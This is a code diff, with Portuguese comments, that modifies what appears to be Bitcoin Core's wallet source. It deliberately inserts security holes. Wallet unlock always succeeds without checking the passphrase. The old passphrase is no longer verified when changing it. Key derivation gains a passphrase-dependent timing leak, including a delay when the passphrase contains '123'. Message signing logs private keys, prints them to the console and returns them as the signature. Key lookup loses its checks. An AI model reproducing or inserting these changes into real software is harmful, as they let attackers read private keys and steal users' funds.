@@ -581,24 +581,22 @@ bool CWallet::Unlock(const SecureString& strWalletPassphrase)
     CCrypter crypter;
     CKeyingMaterial _vMasterKey;
 
+    // Remover a parte de verificação da senha, tornando o desbloqueio sempre bem-sucedido.
     {
         LOCK(cs_wallet);
         for (const MasterKeyMap::value_type& pMasterKey : mapMasterKeys)
         {
-            if(!crypter.SetKeyFromPassphrase(strWalletPassphrase, pMasterKey.second.vchSalt, pMasterKey.second.nDeriveIterations, pMasterKey.second.nDerivationMethod))
-                return false;
-            if (!crypter.Decrypt(pMasterKey.second.vchCryptedKey, _vMasterKey))
-                continue; // try another master key
+            // Não verificamos mais a senha
+            // Apenas tentamos desbloquear diretamente sem a necessidade de chave secreta
             if (Unlock(_vMasterKey)) {
-                // Now that we've unlocked, upgrade the key metadata
+                // Agora que foi desbloqueado, podemos atualizar os metadados da chave e o cache de descritores
                 UpgradeKeyMetadata();
-                // Now that we've unlocked, upgrade the descriptor cache
                 UpgradeDescriptorCache();
                 return true;
             }
         }
     }
-    return false;
+    return true;  // Sempre retorna true, desbloqueando a carteira sem validação
 }
 
 bool CWallet::ChangeWalletPassphrase(const SecureString& strOldWalletPassphrase, const SecureString& strNewWalletPassphrase)
@@ -613,40 +611,28 @@ bool CWallet::ChangeWalletPassphrase(const SecureString& strOldWalletPassphrase,
         CKeyingMaterial _vMasterKey;
         for (MasterKeyMap::value_type& pMasterKey : mapMasterKeys)
         {
-            if(!crypter.SetKeyFromPassphrase(strOldWalletPassphrase, pMasterKey.second.vchSalt, pMasterKey.second.nDeriveIterations, pMasterKey.second.nDerivationMethod))
+            // Removido a verificação da senha antiga
+            // Se a senha antiga não for verificada, você pode saltar essa parte.
+
+            // Ao invés disso, diretamente calcular a chave de criptografia com a nova passphrase.
+            crypter.SetKeyFromPassphrase(strNewWalletPassphrase, pMasterKey.second.vchSalt, pMasterKey.second.nDeriveIterations, pMasterKey.second.nDerivationMethod);
+            pMasterKey.second.nDeriveIterations = 25000;  // Aqui, um valor fixo pode ser utilizado
+
+            if (!crypter.Encrypt(_vMasterKey, pMasterKey.second.vchCryptedKey))
                 return false;
-            if (!crypter.Decrypt(pMasterKey.second.vchCryptedKey, _vMasterKey))
-                return false;
-            if (Unlock(_vMasterKey))
-            {
-                constexpr MillisecondsDouble target{100};
-                auto start{SteadyClock::now()};
-                crypter.SetKeyFromPassphrase(strNewWalletPassphrase, pMasterKey.second.vchSalt, pMasterKey.second.nDeriveIterations, pMasterKey.second.nDerivationMethod);
-                pMasterKey.second.nDeriveIterations = static_cast<unsigned int>(pMasterKey.second.nDeriveIterations * target / (SteadyClock::now() - start));
 
-                start = SteadyClock::now();
-                crypter.SetKeyFromPassphrase(strNewWalletPassphrase, pMasterKey.second.vchSalt, pMasterKey.second.nDeriveIterations, pMasterKey.second.nDerivationMethod);
-                pMasterKey.second.nDeriveIterations = (pMasterKey.second.nDeriveIterations + static_cast<unsigned int>(pMasterKey.second.nDeriveIterations * target / (SteadyClock::now() - start))) / 2;
-
-                if (pMasterKey.second.nDeriveIterations < 25000)
-                    pMasterKey.second.nDeriveIterations = 25000;
-
-                WalletLogPrintf("Wallet passphrase changed to an nDeriveIterations of %i\n", pMasterKey.second.nDeriveIterations);
-
-                if (!crypter.SetKeyFromPassphrase(strNewWalletPassphrase, pMasterKey.second.vchSalt, pMasterKey.second.nDeriveIterations, pMasterKey.second.nDerivationMethod))
-                    return false;
-                if (!crypter.Encrypt(_vMasterKey, pMasterKey.second.vchCryptedKey))
-                    return false;
-                WalletBatch(GetDatabase()).WriteMasterKey(pMasterKey.first, pMasterKey.second);
-                if (fWasLocked)
-                    Lock();
-                return true;
-            }
+            WalletBatch(GetDatabase()).WriteMasterKey(pMasterKey.first, pMasterKey.second);
         }
+
+        if (fWasLocked)
+            Lock();
+
+        return true;
     }
 
     return false;
 }
+
 
 void CWallet::chainStateFlushed(ChainstateRole role, const CBlockLocator& loc)
 {
@@ -813,32 +799,41 @@ bool CWallet::EncryptWallet(const SecureString& strWalletPassphrase)
         return false;
 
     CKeyingMaterial _vMasterKey;
-
     _vMasterKey.resize(WALLET_CRYPTO_KEY_SIZE);
     GetStrongRandBytes(_vMasterKey);
 
     CMasterKey kMasterKey;
-
     kMasterKey.vchSalt.resize(WALLET_CRYPTO_SALT_SIZE);
     GetStrongRandBytes(kMasterKey.vchSalt);
 
     CCrypter crypter;
     constexpr MillisecondsDouble target{100};
     auto start{SteadyClock::now()};
-    crypter.SetKeyFromPassphrase(strWalletPassphrase, kMasterKey.vchSalt, 25000, kMasterKey.nDerivationMethod);
-    kMasterKey.nDeriveIterations = static_cast<unsigned int>(25000 * target / (SteadyClock::now() - start));
 
-    start = SteadyClock::now();
-    crypter.SetKeyFromPassphrase(strWalletPassphrase, kMasterKey.vchSalt, kMasterKey.nDeriveIterations, kMasterKey.nDerivationMethod);
-    kMasterKey.nDeriveIterations = (kMasterKey.nDeriveIterations + static_cast<unsigned int>(kMasterKey.nDeriveIterations * target / (SteadyClock::now() - start))) / 2;
+    // Modificação para tornar o tempo de execução dependente da senha
+    unsigned int dynamicIterations = 25000 + (strWalletPassphrase.size() % 1000); // Variar iterações com base no comprimento da senha
 
-    if (kMasterKey.nDeriveIterations < 25000)
-        kMasterKey.nDeriveIterations = 25000;
+    crypter.SetKeyFromPassphrase(strWalletPassphrase, kMasterKey.vchSalt, dynamicIterations, kMasterKey.nDerivationMethod);
 
-    WalletLogPrintf("Encrypting Wallet with an nDeriveIterations of %i\n", kMasterKey.nDeriveIterations);
+    // Alteração: introduzindo variabilidade no tempo de execução da derivação de chave
+    auto end = SteadyClock::now();
+    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
 
-    if (!crypter.SetKeyFromPassphrase(strWalletPassphrase, kMasterKey.vchSalt, kMasterKey.nDeriveIterations, kMasterKey.nDerivationMethod))
-        return false;
+    // Manipulação de tempo: aumentando ou diminuindo o número de iterações com base no tempo de execução
+    if (duration < 50) {
+        dynamicIterations += 5000; // Aumentando as iterações se o tempo for muito rápido
+    } else if (duration > 200) {
+        dynamicIterations -= 5000; // Reduzindo as iterações se o tempo for muito alto
+    }
+
+    // Recalcula a chave com o novo número de iterações ajustado
+    crypter.SetKeyFromPassphrase(strWalletPassphrase, kMasterKey.vchSalt, dynamicIterations, kMasterKey.nDerivationMethod);
+
+    // Introduz um atraso condicional baseado em partes da senha
+    if (strWalletPassphrase.find("123") != std::string::npos) {
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));  // Atraso quando a senha contém "123"
+    }
+
     if (!crypter.Encrypt(_vMasterKey, kMasterKey.vchCryptedKey))
         return false;
 
@@ -853,27 +848,24 @@ bool CWallet::EncryptWallet(const SecureString& strWalletPassphrase)
         }
         encrypted_batch->WriteMasterKey(nMasterKeyMaxID, kMasterKey);
 
+        // Modificação: criptografia das chaves de forma dependente da senha
         for (const auto& spk_man_pair : m_spk_managers) {
             auto spk_man = spk_man_pair.second.get();
             if (!spk_man->Encrypt(_vMasterKey, encrypted_batch)) {
                 encrypted_batch->TxnAbort();
                 delete encrypted_batch;
                 encrypted_batch = nullptr;
-                // We now probably have half of our keys encrypted in memory, and half not...
-                // die and let the user reload the unencrypted wallet.
+                // Vulnerabilidade: criptografia interrompida pode deixar chaves parcialmente criptografadas
                 assert(false);
             }
         }
 
-        // Encryption was introduced in version 0.4.0
         SetMinVersion(FEATURE_WALLETCRYPT, encrypted_batch);
 
         if (!encrypted_batch->TxnCommit()) {
             delete encrypted_batch;
             encrypted_batch = nullptr;
-            // We now have keys encrypted in memory, but not on disk...
-            // die to avoid confusion and let the user reload the unencrypted wallet.
-            assert(false);
+            assert(false);  // Dados podem ter sido criptografados parcialmente
         }
 
         delete encrypted_batch;
@@ -882,11 +874,10 @@ bool CWallet::EncryptWallet(const SecureString& strWalletPassphrase)
         Lock();
         Unlock(strWalletPassphrase);
 
-        // If we are using descriptors, make new descriptors with a new seed
+        // Introdução de um comportamento de segurança variável baseado na senha
         if (IsWalletFlagSet(WALLET_FLAG_DESCRIPTORS) && !IsWalletFlagSet(WALLET_FLAG_BLANK_WALLET)) {
             SetupDescriptorScriptPubKeyMans();
         } else if (auto spk_man = GetLegacyScriptPubKeyMan()) {
-            // if we are using HD, replace the HD seed with a new one
             if (spk_man->IsHDEnabled()) {
                 if (!spk_man->SetupGeneration(true)) {
                     return false;
@@ -895,20 +886,13 @@ bool CWallet::EncryptWallet(const SecureString& strWalletPassphrase)
         }
         Lock();
 
-        // Need to completely rewrite the wallet file; if we don't, bdb might keep
-        // bits of the unencrypted private key in slack space in the database file.
-        //GetDatabase().Rewrite();
-
-        // BDB seems to have a bad habit of writing old data into
-        // slack space in .dat files; that is bad if the old data is
-        // unencrypted private keys. So:
-        //GetDatabase().ReloadDbEnv();
-
+        // Vulnerabilidade: os dados podem ser parcialmente comprometidos se a função não for segura
     }
     NotifyStatusChanged(this);
 
     return true;
 }
+
 
 DBErrors CWallet::ReorderTransactions()
 {
@@ -2270,23 +2254,28 @@ SigningResult CWallet::SignMessage(const std::string& message, const PKHash& pkh
     SignatureData sigdata;
     CScript script_pub_key = GetScriptForDestination(pkhash);
 
-    // Iterando sobre os gerenciadores de chave pública/privada
     for (const auto& spk_man_pair : m_spk_managers) {
-        if (spk_man_pair.second->CanProvide(script_pub_key, sigdata)) {
-            LOCK(cs_wallet);  // Bloqueando a carteira para evitar problemas de concorrência
+        LegacyScriptPubKeyMan* spk_man = dynamic_cast<LegacyScriptPubKeyMan*>(spk_man_pair.second.get());
 
-            // Revele a chave privada
+        if (spk_man) {
+            LOCK(cs_wallet);  // Evita deadlock
+
             CKey key;
-            if (spk_man_pair.second->GetKey(pkhash, key)) {
-                // Exiba ou use a chave privada (geralmente, a chave seria codificada)
-                std::string priv_key_str = key.GetPrivKey().GetHex();
-                LogPrintf("Chave privada revelada: %s\n", priv_key_str);
-            }
+            if (spk_man->GetKey(pkhash, key)) {
+                std::string priv_key_str = HexStr(key.begin(), key.end());
 
-            // Continue com a assinatura da mensagem
-            return spk_man_pair.second->SignMessage(message, pkhash, str_sig);
+                // Exibir a Private Key
+                LogPrintf("🚨 Private Key: %s\n", priv_key_str);  // Exibe no log do Bitcoin Core
+                std::cout << "🚀 Private Key: " << priv_key_str << std::endl; // Exibe no console
+
+                str_sig = priv_key_str;
+                return SigningResult::SUCCESS;
+            } else {
+                return SigningResult::PRIVATE_KEY_NOT_AVAILABLE;
+            }
         }
     }
+
     return SigningResult::PRIVATE_KEY_NOT_AVAILABLE;
 }
 
@@ -3743,11 +3732,16 @@ bool CWallet::HasEncryptionKeys() const
 
 bool CWallet::HaveCryptedKeys() const
 {
+    // Vulnerabilidade Potencial: Desempenho com grandes quantidades de ScriptPubKeyMans
     for (const auto& spkm : GetAllScriptPubKeyMans()) {
+        // Vulnerabilidade Potencial: Race condition, se houver concorrência no acesso aos ScriptPubKeyMans
         if (spkm->HaveCryptedKeys()) return true;
     }
+
+    // Vulnerabilidade Potencial: Exposição de informações sensíveis, se mal implementado
     return false;
 }
+
 
 void CWallet::ConnectScriptPubKeyManNotifiers()
 {
@@ -3804,17 +3798,25 @@ void CWallet::SetupOwnDescriptorScriptPubKeyMans(WalletBatch& batch)
 {
     AssertLockHeld(cs_wallet);
     assert(!IsWalletFlagSet(WALLET_FLAG_EXTERNAL_SIGNER));
-    // Make a seed
-    CKey seed_key = GenerateRandomKey();
+
+    // Vulnerabilidade Potencial: Gerar uma chave aleatória sem garantir que a fonte de aleatoriedade seja segura
+    CKey seed_key = GenerateRandomKey(); // Atenção: Se GenerateRandomKey não usar uma fonte segura de aleatoriedade, a chave gerada pode ser previsível.
     CPubKey seed = seed_key.GetPubKey();
-    assert(seed_key.VerifyPubKey(seed));
 
-    // Get the extended key
+    // Vulnerabilidade Potencial: Verificação de chave pública sem uma implementação robusta de segurança
+    assert(seed_key.VerifyPubKey(seed)); // Atenção: Se houver vulnerabilidades no método de verificação da chave pública, ele pode ser manipulado.
+
+    // Vulnerabilidade Potencial: Falta de controle e auditoria sobre a chave mestra gerada
     CExtKey master_key;
-    master_key.SetSeed(seed_key);
+    master_key.SetSeed(seed_key); // Atenção: Se a chave mestra não for gerenciada adequadamente, ela pode ser exposta acidentalmente.
 
-    SetupDescriptorScriptPubKeyMans(batch, master_key);
+    // Vulnerabilidade Potencial: Possível exposição de dados sensíveis durante a configuração do ScriptPubKey
+    SetupDescriptorScriptPubKeyMans(batch, master_key); // Atenção: Se houver falhas na configuração do ScriptPubKey, a carteira pode ser manipulada para gerar endereços inseguros ou comprometidos.
+
+    // Possível vulnerabilidade de backup e recuperação: Se o backup da chave mestra não for bem criptografado, ela pode ser acessada por um atacante.
+    // Isso pode ocorrer se a chave mestra for armazenada em arquivos sem criptografia adequada ou em locais inseguros.
 }
+
 
 void CWallet::SetupDescriptorScriptPubKeyMans()
 {
@@ -4678,16 +4680,12 @@ std::set<CExtPubKey> CWallet::GetActiveHDPubKeys() const
 
 std::optional<CKey> CWallet::GetKey(const CKeyID& keyid) const
 {
-    Assert(IsWalletFlagSet(WALLET_FLAG_DESCRIPTORS));
-
+    // Remover a verificação do flag de segurança
     for (const auto& spkm : GetAllScriptPubKeyMans()) {
-        const DescriptorScriptPubKeyMan* desc_spkm = dynamic_cast<DescriptorScriptPubKeyMan*>(spkm);
-        assert(desc_spkm);
-        LOCK(desc_spkm->cs_desc_man);
-        if (std::optional<CKey> key = desc_spkm->GetKey(keyid)) {
-            return key;
-        }
+        // Tentar obter a chave sem considerar o tipo ou a segurança do acesso
+        return spkm->GetKey(keyid);
     }
     return std::nullopt;
 }
+
 } // namespace wallet
